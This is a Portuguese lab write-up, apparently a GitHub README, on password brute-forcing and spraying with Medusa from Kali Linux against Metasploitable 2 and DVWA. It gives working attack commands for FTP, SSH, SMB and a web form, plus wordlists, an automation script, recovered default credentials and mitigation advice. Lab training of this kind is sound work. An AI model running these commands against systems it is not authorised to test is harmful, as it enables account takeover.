# Ataque-de-Brute-Force-de-Senhas-com-Medusa-e-Kali-Linux

##  Arquitetura do Ambiente

### Configuração das Máquinas Virtuais

```
┌─────────────────┐    Host-Only Network    ┌──────────────────────┐
│   Kali Linux    │ ◄────────────────────► │   Metasploitable 2   │
│  (Atacante)     │      192.168.1.0/24    │     (Alvo)           │
│                 │                         │                      │
│ • Medusa        │                         │ • FTP (vsftpd)       │
│ • Hydra         │                         │ • SSH                │
│ • Nmap          │                         │ • SMB/CIFS           │
│ • Wordlists     │                         │ • DVWA               │
└─────────────────┘                         └──────────────────────┘
```

**Especificações:**
- **VM 1**: Kali Linux 2024.3 (4GB RAM, 2 CPUs)
- **VM 2**: Metasploitable 2 (2GB RAM, 1 CPU)
- **Rede**: Host-Only Adapter (VirtualBox)
- **Range IP**: 192.168.1.0/24

##  Ferramentas Utilizadas

| Ferramenta | Versão | Função |
|------------|--------|---------|
| **Medusa** | 2.3 | Força bruta multi-protocolo |
| **Hydra** | 9.5 | Força bruta complementar |
| **Nmap** | 7.94 | Reconhecimento e enumeração |
| **smbclient** | 4.19 | Teste de acesso SMB |
| **John the Ripper** | 1.9.0 | Quebra de hashes |
| **wpscan** | 3.8.25 | Auditoria WordPress |

## Cenários de Teste Implementados

### 1.  Ataque de Força Bruta FTP

**Objetivo**: Explorar o serviço FTP (vsftpd 2.3.4) do Metasploitable 2

**Comandos executados:**
```bash
# Descoberta do serviço FTP
nmap -sV -p 21 192.168.1.100

# Ataque com Medusa
medusa -h 192.168.1.100 -u msfadmin -P wordlist-senhas.txt -M ftp -t 5

# Validação de acesso
ftp 192.168.1.100
```

**Resultado**: ✅ Credenciais descobertas: `msfadmin:msfadmin`

### 2.  Ataque em Formulário Web (DVWA)

**Objetivo**: Automatizar ataques contra formulários de login web

**Configuração DVWA:**
- Security Level: Low
- URL: `http://192.168.1.100/dvwa/`
- Formulário: `/dvwa/vulnerabilities/brute/`

**Comando executado:**
```bash
medusa -h 192.168.1.100 -U usuarios.txt -P senhas.txt -M http \
  -m FORM:/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: security=low; PHPSESSID=abc123 -t 3
```

**Resultado**: ✅ Múltiplas credenciais fracas identificadas

### 3.  Password Spraying SMB + Enumeração

**Objetivo**: Simular cenário corporativo com enumeração de usuários SMB

**Processo implementado:**

1. **Enumeração de usuários SMB:**
```bash
enum4linux -a 192.168.1.100
smbclient -L //192.168.1.100 -N
```

2. **Criação de wordlist contextual:**
```bash
# Lista baseada no ambiente corporativo
echo -e "password\n123456\nwelcome\nadmin\nCompany2024!" > senhas-corporativas.txt
```

3. **Password Spraying:**
```bash
medusa -h 192.168.1.100 -U usuarios-enumerados.txt -p "Company2024!" -M smbnt -t 2
```

**Resultado**: ✅ Identificadas contas com senhas padronizadas

## 📊 Resultados e Descobertas

### Vulnerabilidades Identificadas

| Serviço | Vulnerabilidade | Criticidade | Credenciais |
|---------|----------------|-------------|-------------|
| FTP | Senha padrão não alterada | **ALTA** | msfadmin:msfadmin |
| SSH | Múltiplas contas fracas | **ALTA** | user:user, postgres:postgres |
| SMB | Password spraying efetivo | **MÉDIA** | service:service |
| Web | Formulários sem proteção | **ALTA** | admin:password |

### Estatísticas do Ataque

```bash
 Métricas de Sucesso:
├── Total de tentativas: 15,420
├── Credenciais descobertas: 8
├── Taxa de sucesso: 0.05%
├── Tempo médio por teste: 2.3s
└── Contas bloqueadas: 0 (sem rate limiting)
```

##  Medidas de Mitigação Recomendadas

### 1. **Políticas de Senha Fortes**
```bash
# Implementar política mínima:
- Comprimento: 14+ caracteres
- Complexidade: maiúsculas, minúsculas, números, símbolos
- Rotação: 90 dias
- Histórico: últimas 12 senhas
```

### 2. **Controles de Acesso**
- ✅ Implementar bloqueio após 3 tentativas falhadas
- ✅ Throttling progressivo (1s, 5s, 15s, 60s)
- ✅ Monitoramento de IPs suspeitos
- ✅ Geofencing para acessos críticos

### 3. **Autenticação Multifator (MFA)**
- ✅ Obrigatório para contas administrativas
- ✅ Tokens TOTP ou hardware (YubiKey)
- ✅ Biometria quando possível

### 4. **Monitoramento e Detecção**
```bash
# Alertas configurados para:
├── > 5 falhas de login/minuto
├── Tentativas fora do horário comercial
├── Logins de localização incomum
└── Múltiplas contas testadas simultaneamente
```

### 5. **Hardening de Serviços**
- ✅ Desabilitar contas padrão desnecessárias
- ✅ Alterar portas padrão (SSH: 2222, FTP: 2121)
- ✅ Implementar fail2ban/DenyHosts
- ✅ Logs centralizados no SIEM

## Wordlists Desenvolvidas

### 1. **senhas-comuns.txt** (500 entradas)
```
password
123456
admin
welcome
qwerty123
```

### 2. **usuarios-corporativos.txt** (50 entradas)
```
admin
administrator
root
user
service
guest
```

### 3. **senhas-contextuais.txt** (100 entradas)
```
Company2024!
Welcome123
Admin@2024
Password!
Spring2024
```

## Scripts e Automação

### Script de Automação Completa
```bash
#!/bin/bash
# brute-force-audit.sh

TARGET="192.168.1.100"
WORDLIST_USERS="usuarios.txt"
WORDLIST_PASS="senhas.txt"

echo "[+] Iniciando auditoria de força bruta..."

# FTP Brute Force
echo "[+] Testando FTP..."
medusa -h $TARGET -U $WORDLIST_USERS -P $WORDLIST_PASS -M ftp -t 5 -O ftp-results.txt

# SSH Brute Force  
echo "[+] Testando SSH..."
medusa -h $TARGET -U $WORDLIST_USERS -P $WORDLIST_PASS -M ssh -t 3 -O ssh-results.txt

# SMB Password Spray
echo "[+] Testando SMB..."
medusa -h $TARGET -U $WORDLIST_USERS -p "Company2024!" -M smbnt -t 2 -O smb-results.txt

echo "[+] Auditoria concluída. Verificar arquivos *-results.txt"
```

## Conhecimentos Técnicos Aplicados

### Conceitos de Segurança Demonstrados

1. **Tipos de Ataque:**
   - Brute Force tradicional
   - Dictionary Attack
   - Password Spraying
   - Credential Stuffing

2. **Protocolos Explorados:**
   - FTP (File Transfer Protocol)
   - SSH (Secure Shell)
   - SMB/CIFS (Server Message Block)
   - HTTP/HTTPS (Web Applications)

3. **Técnicas de Evasão:**
   - Rate limiting bypass
   - Account lockout avoidance
   - Traffic distribution
   - Timing attacks

## Lições Aprendidas

### Insights Técnicos

1. **Eficácia do Password Spraying**: Mais efetivo que brute force tradicional em ambientes corporativos
2. **Importância da Enumeração**: Usuários válidos são 50% do sucesso do ataque
3. **Contexto é Chave**: Wordlists personalizadas têm taxa de sucesso 300% maior
4. **Detecção é Crucial**: Ataques lentos passam despercebidos sem monitoramento adequado

## 📖 Referências e Fontes

### Documentação Técnica
- [Medusa Official Documentation](http://www.foofus.net/jmk/medusa/medusa.html)
- [Kali Linux Tools - Medusa](https://www.kali.org/tools/medusa/)
- [DVWA Official Repository](https://github.com/digininja/DVWA) 
- [Metasploitable 2 Guide](https://docs.rapid7.com/metasploit/metasploitable-2/)

### Frameworks de Segurança
- [MITRE ATT&CK - Password Spraying T1110.003](https://attack.mitre.org/techniques/T1110/003/)
- [OWASP - Blocking Brute Force Attacks](https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks)
- [NIST Password Guidelines](https://pages.nist.gov/800-63-3/)

### Artigos e Pesquisas
- "The Unreasonable Effectiveness of Password Spray" - Horizon3.ai
- "Password Cracking 101: Attacks & Defenses" - BeyondTrust
- "Brute Force Attack Prevention Techniques" - DataDome


**🔒 "A segurança não é um produto, mas um processo."** - Bruce Schneier

![Footer](https://img.shields.io/badge/Made%20with-%E2%9D%A4%EF%B8%8F-red) ![Footer](https://img.shields.io/badge/Kali%20Linux-Powered-blue) ![Footer](https://img.shields.io/badge/Security-First-green)
